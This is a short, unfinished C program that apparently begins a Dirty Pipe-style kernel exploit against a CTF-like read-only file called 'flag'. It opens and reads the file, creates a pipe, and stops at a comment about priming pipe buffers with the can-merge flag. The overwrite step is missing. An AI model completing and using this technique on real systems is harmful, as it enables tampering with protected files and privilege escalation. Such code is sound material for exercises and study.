#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>

int main(void){
	// Open the read only file
	int fd = open("flag", O_RDONLY);
	if(fd == -1){
		perror("open");
		exit(1);
	}
	// read the file so that the page cache is populated
	char buf[1024];
	ssize_t n = read(fd, buf, sizeof(buf));
	if(n == -1){
		perror("read");
		exit(1);
	}
	// create a pipe
	int pipefd[2];
	if(pipe(pipefd) == -1){
		perror("pipe");
		exit(1);
	}

	// write the whole 16 buffers of size 4096 of the pipe
	// so that all the pages have flags set to PIPE_FLAG_CAN_MERGE
}